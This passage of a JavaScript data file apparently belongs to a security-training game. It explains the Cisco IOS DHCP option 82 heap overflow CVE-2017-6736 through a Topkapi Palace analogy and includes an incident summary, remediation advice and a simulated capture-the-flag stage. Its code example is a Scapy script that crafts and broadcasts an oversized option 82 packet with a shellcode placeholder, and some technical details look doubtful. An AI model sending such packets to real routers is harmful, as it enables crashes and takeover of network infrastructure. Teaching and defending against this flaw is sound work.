        "Topkapi Palace served as the administrative heart of the Ottoman Empire for four centuries — the seat of the Sultan, home to the Imperial Treasury, and command center of an empire spanning three continents. Its courier system — the imperial postal network — processed messages continuously from provinces, military commanders, and ambassadors. The messages arrived in a standard format with a structured header indicating origin, routing, and priority. Palace clerks copied the header data into their record books for processing. A Byzantine agent discovered that by sending a letter with a deliberately oversized header field — more data than the clerk's record space could hold — the overflow would spill into the adjacent instruction register, causing the clerk to execute whatever the agent had written in the overflow data instead of the legitimate message.",
        "CVE-2017-6736 is that oversized header field. Cisco IOS's DHCP server implementation processed DHCP option 82 — the Relay Agent Information Option added by DHCP relay agents to indicate which network segment a client request originated from. The IOS DHCP server copied option 82 data from incoming packets into a fixed-size heap buffer using `memcpy()`, with the length parameter taken directly from the attacker-controlled option 82 length field in the packet. No bounds check. A 255-byte option 82 field directed into a 64-byte buffer overflowed 191 bytes past the boundary, overwriting heap metadata and adjacent memory — including, in exploitable conditions, function pointers that the IOS scheduler used to dispatch process execution.",
        "DHCP is a fundamental network protocol enabled by default on most Cisco IOS routers, and DHCP requests are unauthenticated by design — the protocol assumes the client doesn't know its identity yet, which is why it's requesting an address in the first place. Any device on any subnet the router serves can send a DHCP packet to it. No credentials. No authentication. An attacker on a guest Wi-Fi network, a compromised IoT device, or any network-connected endpoint in the facility could send the malformed packet. Cisco disclosed CVE-2017-6736 in July 2017 alongside two related variants (CVE-2017-6737 and CVE-2017-6738) — all affecting the same IOS DHCP server codebase, a 20-year-old implementation written in C.",
      ],
      technical: {
        title: "IOS DHCP Option 82 Heap Buffer Overflow — CVE-2017-6736",
        body: [
          "The IOS DHCP server processed DHCP DISCOVER and REQUEST packets, extracting option 82 (defined in RFC 3046) added by DHCP relay agents. Option 82 sub-options specified the circuit ID and remote agent ID of the originating client. The vulnerable code extracted the option 82 data from the packet and used `memcpy(dst, src, option82_len)` to copy it into a fixed-size heap buffer — where `option82_len` was taken directly from the option 82 length field in the packet itself, an attacker-controlled value. Setting this field to 255 while the destination buffer was allocated at 64 bytes caused `memcpy()` to write 191 bytes beyond the buffer boundary, corrupting heap metadata and adjacent allocations. In IOS versions without heap protection mitigations, this allowed overwriting function pointers or process scheduler data structures to redirect execution.",
          "Three CVEs affected the same IOS DHCP server: CVE-2017-6736 (option 82 length field), CVE-2017-6737 (a different option field with the same validation failure), and CVE-2017-6738 (a third variant). All three represented the same root cause: `memcpy()` calls that used attacker-supplied length values without bounds checking. This is one of the oldest and most documented secure coding failure patterns in C — yet it recurred in IOS network protocol parsing code that had been shipping for years. The attack required only that the IOS DHCP server be running (enabled by default with `service dhcp`) and that the attacker be able to send UDP/67 packets to the router's interface — conditions met by any host on any VLAN the router served.",
        ],
        codeExample: {
          label: "CVE-2017-6736 — DHCP option 82 heap overflow payload",
          code: `# ── CRAFT malformed DHCP DISCOVER with oversized option 82 ───────────────────
from scapy.all import *

# Normal option 82 — 8-byte circuit ID (legitimate):
# \x52 = option type 82, \x08 = length 8
normal_option82 = b'\x52\x08\x01\x06' + b'A' * 4

# Malicious option 82 — 255-byte length field, 64-byte buffer → 191-byte overflow:
# \x52 = option 82, \xff = length claim of 255
overflow_payload = b'\x52\xff' + b'A' * 64 + shellcode + b'B' * (191 - len(shellcode))

pkt = (
    Ether(dst="ff:ff:ff:ff:ff:ff") /
    IP(src="0.0.0.0", dst="255.255.255.255") /
    UDP(sport=68, dport=67) /
    BOOTP(op=1, chaddr=RandMAC()._fix()) /
    DHCP(options=[
        ("message-type", "discover"),
        ("relay-agent-information", overflow_payload),
        "end"
    ])
)

# ── SEND with no credentials required — any host on subnet can do this ─────────
sendp(pkt, iface="eth0", verbose=False)
# IOS DHCP server: heap overflows — crash (DoS) or code execution

# ── DETECT vulnerable DHCP server ────────────────────────────────────────────
show running-config | include service dhcp
# 'service dhcp' present + IOS < 15.6(3)M2 = vulnerable

# ── REMEDIATION ───────────────────────────────────────────────────────────────
no service dhcp
# If DHCP server is needed: upgrade to IOS 15.6(3)M2 / 15.4(3)M9 / 15.2(4)M12a
# Use ip dhcp relay information policy to validate option 82 length`,
        },
      },
      incident: {
        title: "IOS DHCP Cluster — Protocol Parser Buffer Overflows as Infrastructure Threat (2017)",
        when: "July 2017",
        where: "Cisco IOS routers with DHCP server enabled globally — all network segments with untrusted devices",
        impact: "Remote code execution or DoS from any subnet device; same vulnerability class as EternalBlue; default-on DHCP server maximizes attack surface",
        body: [
          "Cisco disclosed CVE-2017-6736, 6737, and 6738 in July 2017 as part of a batch advisory for IOS DHCP vulnerabilities. The DHCP server is enabled by default on Cisco IOS routers — `service dhcp` is on in the default configuration unless explicitly disabled. Any device on a subnet served by the router can send DHCP packets, including malformed ones crafted with oversized option fields. In enterprise networks with guest Wi-Fi networks, IoT device VLANs, contractor networks, and untrusted device segments all routing through the same IOS infrastructure, the attack surface was any network-connected device in any building the router served.",
          "The broader significance of CVE-2017-6736 is the vulnerability class it represents. Network infrastructure protocols — DHCP, DNS, OSPF, BGP, SNMP — are implemented in C code that runs at high privilege levels in IOS and similar platforms. They process variable-length fields that protocol specifications define, and each implementation must validate those lengths before copying data into fixed buffers. This is the same vulnerability class as EternalBlue (CVE-2017-0144), which exploited an SMBv1 buffer overflow in Windows and powered WannaCry and NotPetya in 2017. The root cause — `memcpy()` with an attacker-controlled length — is one of the most documented secure coding failures in the C language, documented in every major secure coding standard (CERT C, MISRA C, CWE-120).",
          "Cisco's patch for CVE-2017-6736 added a length validation check before the `memcpy()` call: `if (option82_len > sizeof(buf)) { drop_packet(); return; }` — a one-line fix preventing a vulnerability that could have been caught by code review, static analysis, or fuzzing at development time. The patched IOS versions (15.6(3)M2, 15.4(3)M9, 15.2(4)M12a) shipped in July 2017. IOS upgrades require maintenance windows, compatibility testing, and change management approval — in many enterprise environments, this process takes weeks or months. During that window, any device on any VLAN served by unpatched IOS routers could attempt the overflow. Network devices are servers. They run complex C protocol parsers. They must be patched with the same urgency as any other server.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker (any subnet host)", sub: "DHCP DISCOVER, option 82 length=255", type: "attacker" },
          { label: "IOS DHCP server", sub: "memcpy(dst, src, attacker_len)", type: "system" },
          { label: "IOS heap memory", sub: "191-byte overflow past 64-byte buffer", type: "victim" },
          { label: "Code execution on router", sub: "or crash — same attack surface", type: "result" },
        ],
      },
      timeline: [
        { year: 1460, event: "Topkapi Palace constructed — courier processing system handles all incoming messages with high privilege" },
        { year: 2017, event: "Jul: CVE-2017-6736/6737/6738 disclosed — IOS DHCP option 82 heap buffer overflows", highlight: true },
        { year: 2017, event: "May–Jul 2017: EternalBlue (same vulnerability class) powers WannaCry and NotPetya — $14B combined damage" },
        { year: 2017, event: "Patch: IOS 15.6(3)M2 / 15.4(3)M9 / 15.2(4)M12a — length validation added before memcpy" },
      ],
      keyTakeaways: [
        "Disable the IOS DHCP server if not needed: `no service dhcp` — it's enabled by default and expands the attack surface to every subnet device",
        "Network infrastructure runs complex C protocol parsers at high privilege — patch IOS with the same urgency as Windows or Linux servers",
        "Buffer overflow in protocol parsers: always validate attacker-supplied length fields before `memcpy()` — use `if (len > sizeof(buf)) drop;`",
        "Any device on any subnet can send DHCP packets — the attack surface includes guest Wi-Fi, IoT devices, and compromised endpoints",
        "The CERT C Secure Coding Standard (STR31-C, MEM35-C) explicitly prohibits the pattern that caused CVE-2017-6736 — use these standards in code review",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2017-6736", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170726-anidos" },
        { title: "CVE-2017-6736 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2017-6736" },
        { title: "DHCP Option 82 — RFC 3046", url: "https://www.rfc-editor.org/rfc/rfc3046" },
      ],
    },
    ctf: {
      scenario: "Network infrastructure protocol parsers are implemented in C and run at high privilege — the same class of vulnerability that enabled EternalBlue. CVE-2017-6736 is a buffer overflow in Cisco IOS's DHCP server: the option 82 field gets copied into a fixed-size buffer with no length check. Any device on the local network can send a DHCP packet. No credentials. No external access required. This is what lateral movement looks like once an adversary is already inside.",
      hint: "Send a normal DHCP packet first to confirm the server is live. Then send an oversized one to trigger the overflow.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Confirm the DHCP server is running. Run: probe-dhcp",
        "Send a normal packet to see the baseline response. Run: send-packet normal",
        "Send an oversized packet to overflow the buffer. Run: send-packet exploit 500",
        "Execute a command on the compromised device. Run: execute-command show-classified",
        "Run 'assemble' to see collected fragments, then submit the flag",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{10S_", label: "Mission Brief — Topkapi IOS DHCP Target" },
        { trigger: "send-packet exploit 500", value: "DHCP_", label: "Buffer Overflow — Option 82 Handler Corrupted" },
        { trigger: "execute-command show-classified", value: "BUFF3R_0V3RFL0W}", label: "Device Owned — Classified Data Retrieved" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: TOPKAPI PALACE",
          "Target: Cisco IOS DHCP buffer overflow — CVE-2017-6736",
          "Firmware: v15.6(2)T  CVSS: 8.8",
          "",
          "DHCP option 82 field has no length validation — overflow possible.",
          "Exploitation sequence: probe-dhcp → send-packet exploit 500 → execute-command show-classified",
        ].join("\n"),
      },
      dirs: {
        "/": [{ name: "briefing.txt", isDir: false }],
      },
      extraCommands: {
        "probe-dhcp": () => ({
          lines: [
            "DHCP server: active on all interfaces",
            "Firmware: v15.6(2)T",
            "Packet option field: no length validation — overflow possible",
          ],
        }),
        "send-packet": (args) => {
          const type = args[0] || "normal";
          const size = parseInt(args[1] || "0");
          if (type === "exploit" && size > 100) {
            return {
              lines: [
                `Sending oversized DHCP packet — option field: ${size} bytes`,
                "",
                `Handler buffer: 64 bytes.  Received: ${size} bytes.`,
                "Buffer overflow — adjacent memory overwritten",
                "Control flow corrupted — handler now executes your commands",
                "",
                "Device compromised. Run: execute-command <command>",
              ],
            };
          }
          return {
            lines: [
              "Normal DHCP packet sent → OFFER received",
              "(Try: send-packet exploit 500)",
            ],
          };
        },
        "execute-command": (args) => {
          const cmd = args.join(" ") || "show-classified";
          return {
            lines: [
              `Executing on device: ${cmd}`,
              cmd.includes("who") ? "uid=0(root) — full device access" : "",
              "Run 'assemble' to retrieve your fragment.",
            ].filter(Boolean),
          };
        },
      },
    },
  },
  ...cisco2Stages,
  ...cisco3Stages,
  ...cisco4Stages,
];
